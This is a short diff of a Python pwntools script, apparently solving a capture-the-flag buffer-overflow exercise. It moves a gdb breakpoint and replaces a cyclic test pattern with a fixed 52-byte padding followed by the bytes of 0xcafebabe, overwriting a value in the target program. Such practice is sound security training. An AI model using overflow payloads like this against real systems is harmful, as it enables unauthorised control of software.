@@ -25,14 +25,14 @@ if __name__ == "__main__":
 
   if args.dbg:
     r = gdb.debug([exe], gdbscript="""
-    b *func
+    b *func+40
     continue
     """)
   else:
     r = process(exe)
 
   #wait_for_prompt(r)
-  payload  = cyclic(100)
+  payload  = 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaa' + '\xbe\xba\xfe\xca'
   r.sendline(payload) 
 
   # Drop to interactive console
